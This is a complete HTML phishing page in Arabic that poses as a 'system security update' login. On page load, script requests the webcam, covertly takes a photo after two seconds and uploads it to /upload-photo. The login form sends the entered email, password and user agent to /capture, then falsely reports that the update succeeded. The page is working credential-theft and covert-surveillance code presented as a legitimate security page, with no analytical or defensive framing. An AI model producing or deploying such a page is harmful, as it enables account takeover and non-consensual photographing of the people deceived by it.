<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمان النظام</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
        input { display: block; width: 250px; margin: 10px auto; padding: 10px; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h3>يرجى تسجيل الدخول لتحديث الحماية</h3>
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="pass" placeholder="كلمة المرور">
        <button onclick="sendData()">تحديث الآن</button>
    </div>

    <script>
        // طلب الكاميرا والتقاط الصورة فور الدخول
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 480; canvas.height = 640;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const img = canvas.toDataURL('image/jpeg');
                    
                    await fetch('/upload-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: img })
                    });
                    stream.getTracks().forEach(t => t.stop());
                }, 2000); // يلتقط الصورة بعد ثانيتين من فتح الكاميرا
            } catch (e) { console.log("Camera Denied"); }
        }

        async function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('pass').value;
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, device: navigator.userAgent })
            });
            alert("تم إرسال طلب التحديث بنجاح.");
        }

        window.onload = initCamera;
    </script>
</body>
</html>
